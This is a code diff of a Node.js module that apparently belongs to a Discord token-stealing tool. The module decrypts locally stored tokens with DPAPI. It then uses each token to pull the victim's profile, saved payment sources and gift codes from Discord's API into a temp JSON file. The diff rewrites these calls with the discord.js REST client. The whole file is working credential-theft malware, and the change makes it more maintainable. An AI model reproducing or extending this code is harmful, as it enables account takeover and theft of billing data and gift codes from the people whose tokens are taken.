@@ -2,13 +2,12 @@ const { join } = require('path');
 const { browsers } = require('../util/variables');
 const { execSync } = require('child_process');
 const { readFileSync, existsSync, readdirSync, writeFileSync, statSync } = require('fs');
-const axios = require('axios');
-const { userAgent } = require('../config');
 const { getTempFolder } = require('../util/init');
-const { sleep } = require('../util/general');
 const fs = require('fs');
 const { Dpapi } = require('@primno/dpapi');
 const crypto = require('crypto');
+const { REST } = require('@discordjs/rest');
+const { Routes } = require('discord-api-types/v10');
 
 const jsonFile = join(getTempFolder(), 'Discord.json');
 writeFileSync(jsonFile, '{}');
@@ -70,10 +69,8 @@ const decryptRickRoll = (path) => {
 };
 
 const handleTokens = async (tokens, resolve) => {
-  const userInfo = async (token, source) => {
-    const { data } = await axios.get('https://discord.com/api/v10/users/@me', {
-      headers: { Authorization: token, 'User-Agent': userAgent }
-    });
+  const userInfo = async (rest, token, source) => {
+    const data = await rest.get(Routes.user('@me'));
     data.token = token;
     data.source = source;
     let info = JSON.parse(readFileSync(jsonFile, 'utf8'));
@@ -86,10 +83,8 @@ const handleTokens = async (tokens, resolve) => {
       writeFileSync(jsonFile, JSON.stringify(info));
     }
   };
-  const paymentSources = async (token) => {
-    const { data } = await axios.get('https://discord.com/api/v10/users/@me/billing/payment-sources', {
-      headers: { Authorization: token, 'User-Agent': userAgent }
-    });
+  const paymentSources = async (rest) => {
+    const data = await rest.get(Routes.user('@me').concat('/billing/payment-sources'));
     let info = JSON.parse(readFileSync(jsonFile, 'utf8'));
     if (!info.billing) info.billing = [];
     data.forEach(billing => {
@@ -97,10 +92,8 @@ const handleTokens = async (tokens, resolve) => {
     });
     writeFileSync(jsonFile, JSON.stringify(info));
   };
-  const gifts = async (token) => {
-    const { data } = await axios.get('https://discord.com/api/v10/users/@me/outbound-promotions/codes', {
-      headers: { Authorization: token, 'User-Agent': userAgent }
-    });
+  const gifts = async (rest) => {
+    const data = await rest.get(Routes.user('@me').concat('/outbound-promotions/codes'));
     let info = JSON.parse(readFileSync(jsonFile, 'utf8'));
     if (!info.gifts) info.gifts = [];
     data.forEach(gift => {
@@ -109,30 +102,10 @@ const handleTokens = async (tokens, resolve) => {
     writeFileSync(jsonFile, JSON.stringify(info));
   };
   for (const { token, source } of tokens) {
-    try {
-      await userInfo(token, source);
-      try {
-        await paymentSources(token);
-        try {
-          await gifts(token);
-        } catch (e) {
-          if (e.response.status === 429 && e.response.data.retry_after) {
-            await sleep((e.response.data.retry_after * 1000) + 100);
-            await gifts(token);
-          }
-        }
-      } catch (e) {
-        if (e.response.status === 429 && e.response.data.retry_after) {
-          await sleep((e.response.data.retry_after * 1000) + 100);
-          await paymentSources(token);
-        }
-      }
-    } catch (e) {
-      if (e.response.status === 429 && e.response.data.retry_after) {
-        await sleep((e.response.data.retry_after * 1000) + 100);
-        await userInfo(token, source);
-      }
-    }
+    const rest = new REST({ version: '10', authPrefix: '' }).setToken(token);
+    await userInfo(rest, token, source);
+    await paymentSources(rest);
+    await gifts(rest);
   }
   resolve();
 };
